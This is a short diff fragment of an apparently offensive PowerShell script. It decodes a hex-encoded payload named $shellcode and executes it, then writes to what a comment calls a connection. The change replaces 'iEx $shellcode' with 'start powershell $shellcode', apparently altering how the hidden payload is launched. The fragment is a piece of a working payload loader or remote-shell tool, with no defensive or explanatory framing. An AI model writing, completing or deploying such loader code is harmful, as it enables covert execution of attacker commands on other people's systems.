@@ -24,7 +24,7 @@ for ($i = 0; $i -lt $bytes.Count; $i++) {
     $byteArray[$i] = [byte]::Parse($bytes[$i], [System.Globalization.NumberStyles]::HexNumber)
 }
 $shellcode = [System.Text.Encoding]::Unicode.GetString($byteArray)
-iEx $shellcode
+start powershell $shellcode
 $Writer.WriteLine("system")
 $Writer.Flush()
 # Close the connection
